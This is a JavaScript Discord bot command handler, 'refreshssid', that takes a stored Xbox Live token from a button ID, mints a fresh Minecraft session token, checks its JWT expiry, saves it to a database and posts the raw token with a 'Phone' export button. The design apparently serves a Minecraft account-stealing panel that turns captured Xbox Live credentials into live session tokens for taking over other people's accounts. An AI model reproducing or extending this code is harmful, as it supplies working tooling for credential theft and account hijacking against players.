const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const { queryParams } = require("../../../db/database");
const generate = require('../../utils/generate');
const ssid = require('../../utils/minecraft/ssid');

module.exports = {
    name: "refreshssid",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            const xbl = interaction.customId.split("|")[1];
            const newssid = await ssid(xbl, true);

            if (!newssid || newssid === "Couldn't Get!" || newssid === "No Minecraft!") {
                return interaction.reply({
                    content: "Couldn't get SSID!",
                    ephemeral: true
                });
            }

            if (newssid === 'u should probably chill with the spam'){
                    return interaction.reply({
                    content: "Let's keep it civil here and not spam requests :)\n You can try again in like a min.",
                    ephemeral: true
                });
            }

            const payload = decodeJwtPayload(newssid);
            if (!payload || !payload.exp) {
                return interaction.reply({ content: `Invalid SSID!`, ephemeral: true });
            }

            const expirationTime = new Date(payload.exp * 1000);
            const now = Date.now();
            if (now > expirationTime.getTime()) {
                return interaction.reply({
                    embeds: [{
                        title: `SSID has been expired!`,
                        color: 0x808080
                    }],
                    ephemeral: true
                });
            }

            const formattedExpTime = `<t:${Math.floor(expirationTime.getTime() / 1000)}:R>`;
            const rId = generate(32);
            await queryParams(`INSERT INTO actions (id, action) VALUES (?, ?)`, [rId, `phonessid|${newssid}`]);

            const buttonsRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`phonessid|${rId}`)
                    .setLabel("Phone")
                    .setStyle(ButtonStyle.Secondary)
            );

            return interaction.reply({
                embeds: [{
                    title: `Expires: ${formattedExpTime}`,
                    description: "```" + newssid + "```",
                    color: 0x808080
                }],
                components: [buttonsRow],
                ephemeral: true
            });

        } catch (error) {
            console.error("Error in refreshssid handler:", error);
            return interaction.reply({
                content: "An error occurred while refreshing the SSID.",
                ephemeral: true
            });
        }
    }
};

function decodeJwtPayload(token) {
    try {
        const payloadBase64 = token.split('.')[1];
        const payload = Buffer.from(payloadBase64, 'base64').toString('utf-8');
        return JSON.parse(payload);
    } catch (error) {
        return null;
    }
}
